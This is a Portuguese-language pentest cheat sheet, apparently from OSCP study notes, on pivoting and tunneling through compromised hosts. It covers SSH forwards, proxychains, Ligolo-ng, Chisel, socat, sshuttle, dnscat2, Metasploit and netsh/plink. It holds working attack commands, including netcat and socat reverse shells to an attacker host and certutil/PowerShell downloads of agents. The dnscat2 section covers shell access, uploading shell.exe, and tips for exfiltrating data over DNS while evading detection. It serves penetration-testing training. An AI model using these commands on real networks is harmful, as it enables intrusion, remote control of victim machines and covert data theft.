# Pivoting & Tunneling

## Índice

- [SSH Tunneling](#ssh-tunneling)
  - [Port Forwarding Local](#port-forwarding-local)
  - [Port Forwarding Remoto](#port-forwarding-remoto)
  - [Port Forwarding Dinâmico (SOCKS)](#port-forwarding-dinâmico-socks)
- [Proxychains](#proxychains)
- [Ligolo-ng](#ligolo-ng)
- [Chisel](#chisel)
- [Socat](#socat)
- [sshuttle](#sshuttle)
- [dnscat2 (Tunneling DNS)](#dnscat2-tunneling-dns)
- [Pivoting com Metasploit](#pivoting-com-metasploit)
- [Port Forwarding no Windows](#port-forwarding-no-windows)

---

## SSH Tunneling

### Verificação Rápida (One-liner)

```shell
# Configuração rápida de proxy SOCKS
ssh -D 9050 -N -f $user@$pivot && proxychains nmap -sT -Pn $internal_target
```

### Port Forwarding Local

> Encaminhar porta remota para a máquina local

```shell
# Sintaxe: ssh -L <porta_local>:<host_alvo>:<porta_alvo> <user>@<pivot>

# Encaminhar MySQL remoto (3306) para porta local 3306
ssh -L 3306:localhost:3306 $user@$pivot

# Encaminhar host interno através do pivot
ssh -L 3306:10.10.10.5:3306 $user@$pivot

# Acessar via localhost
mysql -u root -h 127.0.0.1 -p --skip-ssl
```

### Port Forwarding Remoto

> Encaminhar porta local para máquina remota (túnel reverso)

```shell
# Sintaxe: ssh -R <porta_remota>:<host_alvo>:<porta_alvo> <user>@<pivot>

# Encaminhar porta local 4444 para porta remota 5555
ssh -R 5555:localhost:4444 $user@$pivot

# Uso: iniciar listener nc localmente, conectar ao pivot:5555 a partir do alvo
# Local: nc -lvnp 4444
# Alvo: nc $pivot 5555 -e /bin/bash

# Encaminhar recurso externo através do pivot
ssh -R 5555:208.86.224.90:80 $user@$pivot
```

### Port Forwarding Dinâmico (SOCKS)

> Criar proxy SOCKS através do pivot

```shell
# Criar proxy SOCKS na porta local 9050
ssh -D 9050 $user@$pivot

# Com chave SSH
ssh -i key.pem -D 9050 $user@$pivot

# Para versões antigas de SSH
ssh -D 9050 $user@$pivot -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa

# Manter ativo em background
ssh -D 9050 -N -f $user@$pivot
```

### Tunneling Combinado

```shell
# Múltiplos port forwards simultaneamente
ssh -L 3306:localhost:3306 -L 8080:localhost:80 -D 9050 $user@$pivot
```

---

## Proxychains

### Configuração

```shell
# Editar configuração
sudo nano /etc/proxychains4.conf
```

```ini
# /etc/proxychains4.conf
dynamic_chain
# strict_chain (comentar esta linha)

[ProxyList]
socks4 127.0.0.1 9050
# socks5 127.0.0.1 1080
```

### Uso

```shell
# Executar comandos pelo proxy
proxychains nmap -sT -Pn -n $target
proxychains mysql -h $target -u root
proxychains evil-winrm -i $target -u Administrator -H <hash>
proxychains ssh $user@$target
proxychains curl http://$target

# Múltiplos hops (adicionar ao config)
socks4 127.0.0.1 9050
socks4 127.0.0.1 9051
```

### Verificar Conexão

```shell
# Verificar se o tunnel está ativo
ss -lntp | grep 9050
ps aux | grep "ssh -D"
kill <PID>  # Para parar o tunnel
```

---

## Ligolo-ng

> **📚 Para guia completo com pivoting multi-hop, port forwarding e troubleshooting, veja [Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)**

### Configuração Rápida

```shell
# Download
git clone https://github.com/nicocha30/ligolo-ng.git

# Criar interface TUN (Atacante)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Atacante (Proxy)

```shell
# Iniciar proxy
sudo ./proxy -selfcert

# Após agent conectar
ligolo-ng > session
ligolo-ng > [ID da sessão]

# Adicionar rota para rede interna
sudo ip route add 172.16.0.0/24 dev ligolo

# Iniciar tunnel
ligolo-ng > start
```

### Vítima (Agent)

```shell
# Linux
./agent -connect $lhost:11601 -ignore-cert

# Windows
agent.exe -connect $lhost:11601 -ignore-cert
```

### Comandos Avançados

```shell
# Listar interfaces
ligolo-ng > interface_list

# Roteamento automático
ligolo-ng > autoroute

# Criar interface com nome
ligolo-ng > interface_create --name "internal"
ligolo-ng > interface_add_route --name internal --route 192.168.2.0/24

# Iniciar em interface específica
ligolo-ng > tunnel_start --tun ligolo
```

### Transferência de Arquivos

```shell
# Download (no PowerShell)
powershell wget -uri "http://$lhost:8000/agent.exe" -OutFile agent.exe

# Ou via certutil
certutil -urlcache -split -f "http://$lhost:8000/agent.exe" agent.exe
```

---

## Chisel

> **📚 Para guia completo com cenários de pivoting e troubleshooting, veja [Guia Completo Chisel](Chisel-Complete-Guide.md)**

### Configuração

```shell
# Servidor (Atacante)
./chisel server -p 8080 --reverse
```

### Client (Vítima)

```shell
# Linux
./chisel client $lhost:8080 R:socks

# Windows
chisel.exe client $lhost:8080 R:socks
```

### Proxy SOCKS

```shell
# Servidor (Atacante)
./chisel server -p 8080 --reverse

# Client (Vítima) - Criar proxy SOCKS no atacante:1080
./chisel client $lhost:8080 R:1080:socks

# Usar com proxychains
# Adicionar ao /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn $target
```

### Port Forwarding

```shell
# Servidor (Atacante)
./chisel server -p 8080 --reverse

# Client (Vítima) - Encaminhar vítima:3389 para atacante:3389
./chisel client $lhost:8080 R:3389:127.0.0.1:3389

# Conectar ao localhost:3389 a partir do atacante
rdesktop 127.0.0.1
```

### Múltiplos Tunnels

```shell
./chisel client $lhost:8080 R:1080:socks R:3389:127.0.0.1:3389 R:445:10.10.10.5:445
```

---

## Socat

### Port Forwarding com Socat

```shell
# Encaminhar porta local 80 para host remoto
socat TCP-LISTEN:80,fork TCP:$target:80

# Com endereço de bind
socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:$target:80
```

### Encaminhamento UDP

```shell
socat UDP-LISTEN:53,fork UDP:$target:53
```

### Relay

```shell
# Criar relay (vítima)
socat TCP-LISTEN:3333,fork TCP:$lhost:4444

# Cadeia de conexão: atacante -> vítima:3333 -> lhost:4444
```

### Shell TTY

```shell
# Atacante (listener)
socat file:`tty`,raw,echo=0 TCP-L:4444

# Vítima (conectar de volta)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444
```

---

## sshuttle

> VPN via SSH — proxy transparente

### Uso Básico

```shell
# Proxy para toda a subnet
sshuttle -r $user@$pivot 10.10.10.0/24

# Com chave SSH
sshuttle -r $user@$pivot 10.10.10.0/24 --ssh-cmd "ssh -i key.pem"

# Excluir rede local
sshuttle -r $user@$pivot 10.10.10.0/24 -x 10.10.10.1

# DNS pelo tunnel
sshuttle --dns -r $user@$pivot 10.10.10.0/24
```

### Múltiplas Subnets

```shell
sshuttle -r $user@$pivot 10.10.10.0/24 172.16.0.0/16 192.168.0.0/16
```

---

## dnscat2 (Tunneling DNS)

> Tunela tráfego via consultas DNS — bypassa DPI (Deep Packet Inspection)

### Configuração do Servidor (Atacante - Kali)

```shell
# Instalar
sudo apt install dnscat2

# Iniciar servidor (modo DNS autoritativo — requer domínio)
dnscat2-server $domain

# Iniciar servidor (modo conexão direta — sem domínio)
dnscat2-server --dns server=127.0.0.1,port=53 --no-cache
dnscat2-server --dns server=127.0.0.1,port=53,type=TXT --no-cache
```

### Client (Vítima - Windows)

```powershell
# Client PowerShell (dnscat2-powershell)
# https://github.com/lukebaggett/dnscat2-powershell

Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer $lhost -Domain $domain
Start-Dnscat2 -DNSServer $lhost -Domain $domain -Exec cmd
```

### Client (Vítima - Linux)

```shell
# Compilar client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Conectar ao servidor
./dnscat --dns "server=$lhost,port=53"
./dnscat $domain
```

### Comandos do Servidor

```shell
# Listar sessões
dnscat2> sessions

# Interagir com sessão
dnscat2> session -i 1

# Executar shell
command> shell
command> exec

# Port forwarding
command> listen 127.0.0.1:4444 $target:445

# Download/Upload de arquivos
command> download C:\users\admin\Desktop\flag.txt
command> upload shell.exe C:\Temp\shell.exe
```

### Boas Práticas no Tunneling DNS

```text
- Usar subdomínios para exfiltração de dados
- Registros TXT suportam mais dados que registros A
- Definir intervalos de consulta mais longos para evitar detecção
- Usar --secret para tunnel criptografado
```

---

## Pivoting com Metasploit

### Auto Route

```shell
# Em sessão meterpreter
run autoroute -s 10.10.10.0/24

# Ou manualmente
run post/multi/manage/autoroute
```

### Proxy SOCKS com Metasploit

```shell
# Colocar sessão meterpreter em background
background

# Iniciar proxy SOCKS
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run

# Usar com proxychains
```

### Port Forward

```shell
# No meterpreter
portfwd add -l 3389 -p 3389 -r $target

# Remover
portfwd delete -l 3389 -p 3389 -r $target

# Listar
portfwd list
```

### Upgrade Shell para Meterpreter

```shell
sessions -u <id_da_sessão>
```

---

## Port Forwarding no Windows

### netsh

```cmd
:: Adicionar port forward
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

:: Listar forwards
netsh interface portproxy show all

:: Remover forward
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

:: Resetar tudo
netsh interface portproxy reset
```

### plink.exe

```cmd
:: Download via PowerShell
powershell wget -uri "http://$lhost/plink.exe" -OutFile plink.exe

:: Criar tunnel reverso
plink.exe -ssh -l $user -pw $password -R $lport:127.0.0.1:3389 $lhost
```

### Port Scanner em PowerShell

```powershell
# Ping sweep
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.10.10.$_", 1) | where status -ne 'TimedOut' | select Address }

# Port scan
1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("$target", $_)) "Porta $_ aberta" } 2>$null
```

---

## Double Pivoting

### Cenário: Atacante → Pivot1 → Pivot2 → Alvo

```shell
# Passo 1: SSH para Pivot1 com SOCKS
ssh -D 9050 user1@pivot1

# Passo 2: Via proxychains, SSH para Pivot2 com outro SOCKS
proxychains ssh -D 9051 user2@pivot2

# Adicionar ambos ao config do proxychains
# socks5 127.0.0.1 9050
# socks5 127.0.0.1 9051

# Passo 3: Acessar o alvo
proxychains nmap -sT -Pn target
```

---

## Referência Rápida

| Ferramenta | Caso de Uso | Comando |
| ------ | ---------- | --------- |
| SSH Local | Acessar porta remota localmente | `ssh -L 8080:target:80 user@pivot` |
| SSH Remoto | Expor porta local para remoto | `ssh -R 9999:localhost:22 user@pivot` |
| SSH Dinâmico | Proxy SOCKS | `ssh -D 9050 user@pivot` |
| Ligolo-ng | Tunnel completo (camada 3) | `./proxy -selfcert` / `./agent -connect` |
| Chisel | SOCKS + port forward | `chisel server -p 8080 --reverse` |
| sshuttle | VPN via SSH | `sshuttle -r user@pivot 10.0.0.0/8` |
| Proxychains | Rotear ferramentas pelo proxy | `proxychains nmap target` |
| Socat | Relay de porta | `socat TCP-LISTEN:80,fork TCP:target:80` |

---

## Veja Também

### Guias Detalhados

- **[Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)** - Walkthrough completo single/multi-hop, troubleshooting
- **[Guia Completo Chisel](Chisel-Complete-Guide.md)** - Pivoting rápido com SOCKS5 e port forwarding
- **[Movimento Lateral](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash após pivoting

### Exploração de AD (Após Pivoting)

- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound, abuso de ACL na rede interna
- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Atacar Domain Controllers internos

### Preparação OSCP

- **[Exemplos de Laboratório](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - Exemplo de pivoting no AD Set
- **[Dicas do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Gestão de tempo no AD Set
